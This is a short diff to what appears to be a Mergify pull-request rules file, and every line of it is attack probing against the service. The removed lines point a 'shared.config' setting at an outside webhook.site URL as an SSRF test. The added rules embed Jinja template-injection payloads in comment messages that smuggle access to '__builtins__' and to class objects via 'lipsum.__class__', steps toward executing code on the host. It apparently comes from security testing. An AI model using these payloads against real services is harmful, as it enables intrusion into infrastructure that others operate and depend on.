@@ -1,10 +1,23 @@
-shared:
-  config: https://webhook.site/f5b0a3d0-8a12-4a3b-9c4d-e5f6a7b8c9d0/mergify-config.yml
-
 pull_request_rules:
-  - name: ssrf-config-test
+  - name: ssti-smuggled-dunder
     conditions:
       - base=main
     actions:
       comment:
-        message: "SSRF config test - shared.config loaded"
+        message: |
+          TITLE={{ title }}
+          RESULT={{ ([dict]|map(attribute=title))|first }}
+  - name: ssti-smuggled-builtins
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          BUILTINS={{ ([dict]|map(attribute=title))|first|attr("__builtins__") }}
+  - name: ssti-get-class
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          CLASS_TEST={{ lipsum.__class__ }}
